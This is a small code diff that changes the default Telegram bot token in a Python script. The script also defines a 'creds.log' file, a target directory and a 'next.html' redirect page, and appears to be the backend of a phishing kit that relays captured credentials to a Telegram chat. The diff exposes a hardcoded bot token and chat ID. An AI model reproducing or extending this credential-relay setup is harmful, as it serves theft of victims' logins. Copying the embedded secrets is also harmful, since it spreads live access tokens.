@@ -17,7 +17,7 @@ TARGET_DIR = BASE_DIR / "popa" if (BASE_DIR / "popa").exists() else BASE_DIR
 LOG_FILE = BASE_DIR / "creds.log"
 
 # Telegram — set via env on Render, or edit defaults below
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9193237322:AAGd49MxB5aoMbRqgDBM1KH0KTWcX9UEpZs")
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9193237322:AAEtGVtgGanrSQxs97fBZaBIQC_iF_IeoXo")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8869604033")
 
 NEXT_PAGE = "next.html"
